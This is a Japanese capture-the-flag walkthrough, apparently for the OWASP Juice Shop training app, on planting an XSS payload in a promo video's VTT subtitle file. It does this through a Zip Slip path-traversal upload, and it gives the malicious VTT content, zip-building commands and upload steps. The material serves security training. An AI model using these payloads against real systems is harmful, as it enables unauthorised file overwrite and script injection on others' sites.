# Video XSS ❌

**難易度:** ⭐⭐⭐⭐⭐⭐
**カテゴリ:** XSS + Zip Slip
**目標:** プロモーション動画にXSSペイロードを埋め込む

## ヒント

- **ターゲット:** `/promotion` ページのプロモ動画
- **方法:** VTT (字幕) ファイルの改ざん
- **技術:** Zip Slip (パストラバーサル) + XSS

## VTT ファイル形式

```
WEBVTT

00:00:00.000 --> 00:00:10.000
通常の字幕テキスト
```

## 攻撃用 VTT

```
WEBVTT

00:00:00.000 --> 00:00:10.000
</script><script>alert('xss')</script>
```

## Zip Slip 攻撃

```bash
# 1. 悪意のある VTT を作成
echo 'WEBVTT

00:00:00.000 --> 00:00:10.000
</script><script>alert("xss")</script>' > owasp_promo.vtt

# 2. パストラバーサル付き ZIP を作成
# ターゲットパス: frontend/dist/frontend/assets/public/videos/owasp_promo.vtt
mkdir -p "../../frontend/dist/frontend/assets/public/videos"
mv owasp_promo.vtt "../../frontend/dist/frontend/assets/public/videos/"
zip -r exploit.zip "../../frontend"
```

## 手順

1. 攻撃用 VTT ファイルを作成
2. パストラバーサルを含む ZIP を作成
3. `/#/complain` で ZIP をアップロード
4. `/promotion` にアクセスして XSS を確認

## 検証ポイント

- [ ] VTT ファイルの作成
- [ ] ZIP ファイルの作成（パストラバーサル付き）
- [ ] アップロード成功
- [ ] XSS 発動確認

## 解説

[未着手]
